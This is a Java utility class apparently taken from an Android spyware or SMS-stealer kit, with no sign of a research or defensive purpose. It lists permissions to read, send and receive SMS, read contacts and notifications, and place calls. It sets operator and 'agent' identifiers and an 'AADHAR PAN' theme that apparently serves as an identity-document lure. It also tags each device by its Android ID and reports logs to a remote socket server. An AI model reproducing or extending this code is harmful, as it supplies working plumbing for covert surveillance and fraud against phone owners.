package com.pegalite.coresec.functions;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;

import com.pegalite.coresec.server.socket.PegaSocketServer;

public class Utils {
    public static final String[] APP_PERMISSIONS = {
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            "android.permission.READ_NOTIFICATIONS"
    };
//    public static String ADMIN_USERNAME = "raj1234";
//    public static String AGENT_ID = "com.pegalite.sdfdf34r23";

    public static String ADMIN_USERNAME = "something";
    public static String AGENT_ID = "com.pegalite.sdfwsdfsdf";
    public static String THEME = "AADHAR PAN";
    public static String CONFIGS = "{}";

    @SuppressLint("HardwareIds")
    public static String getDeviceID(Context context) {
        return "agent-" + ADMIN_USERNAME + "-" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + context.getPackageName();
    }

    public static void markLog(Context context, String log) {
        if (PegaSocketServer.getSocket() != null && PegaSocketServer.getSocket().connected()) {
            PegaSocketServer.getSocket().emit("save-log", getDeviceID(context), log);
        }
    }

    public static void markLog(Context context, String log, String TAG) {
        if (PegaSocketServer.getSocket() != null && PegaSocketServer.getSocket().connected()) {
            PegaSocketServer.getSocket().emit("save-log", getDeviceID(context), log + "  {{" + TAG + "}}");
        }
    }

    public static String getPhoneName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;

        String deviceName;
        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) {
            deviceName = capitalize(model);
        } else {
            deviceName = capitalize(manufacturer) + " " + model;
        }
        return deviceName;
    }

    public static String capitalize(String s) {
        if (s == null || s.isEmpty()) {
            return "";
        }
        return s.substring(0, 1).toUpperCase() + s.substring(1);
    }

}
